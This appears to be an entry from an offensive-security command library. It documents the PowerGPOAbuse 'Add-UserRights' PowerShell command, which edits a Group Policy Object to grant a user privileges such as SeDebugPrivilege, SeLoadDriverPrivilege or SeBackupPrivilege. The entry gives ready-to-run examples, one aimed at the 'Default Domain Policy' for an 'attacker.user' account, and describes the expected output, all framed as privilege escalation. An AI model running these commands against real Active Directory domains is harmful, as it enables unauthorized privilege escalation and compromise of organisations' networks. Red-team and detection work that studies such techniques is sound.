---
id: 0d414f78-cc2f-4cf2-9145-10d80fd67ef4
name: add-user-rights-gpo
type: command
executor: powershell
data: Add-UserRights -Rights $_RIGHTS -Identity $_USERNAME -GPOIdentity $_GPONAME
output: null
created_at: '2023-04-06T03:56:03.664962+00:00'
updated_at: '2023-10-10T20:26:15.994624+00:00'
platforms:
  - Windows
tags:
  - gpo-abuse
  - privilege-escalation
verified: true
validated: true
---

# add-user-rights-gpo

## Command

```powershell
Add-UserRights -Rights $_RIGHTS -Identity $_USERNAME -GPOIdentity $_GPONAME
```

## Description

This command assigns specified user rights (privileges) to a user account through GPO modification using PowerGPOAbuse. Common rights include SeDebugPrivilege for process debugging or SeLoadDriverPrivilege for driver installation, aiding in further exploitation.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -Rights $_RIGHTS | Comma-separated list of rights (e.g., "SeLoadDriverPrivilege","SeDebugPrivilege") | Yes |
| -Identity $_USERNAME | The username to assign rights to (e.g., 'Bobby') | Yes |
| -GPOIdentity $_GPONAME | The name of the GPO to modify (e.g., 'SuperSecureGPO') | Yes |

## Examples

### Basic Usage

```powershell
Add-UserRights -Rights "SeLoadDriverPrivilege","SeDebugPrivilege" -Identity 'Bobby' -GPOIdentity 'SuperSecureGPO'
```

### Advanced Usage

```powershell
Add-UserRights -Rights "SeBackupPrivilege" -Identity 'attacker.user' -GPOIdentity 'Default Domain Policy'
```

## Expected Output

Successful execution produces output like:

"User rights 'SeLoadDriverPrivilege,SeDebugPrivilege' assigned to 'Bobby' in GPO 'SuperSecureGPO'."

Errors include invalid rights or GPO not found.

## Related

- [[procedures/GPO-Abuse-with-PowerGPOAbuse]]
- [[commands/add-local-admin-gpo]]
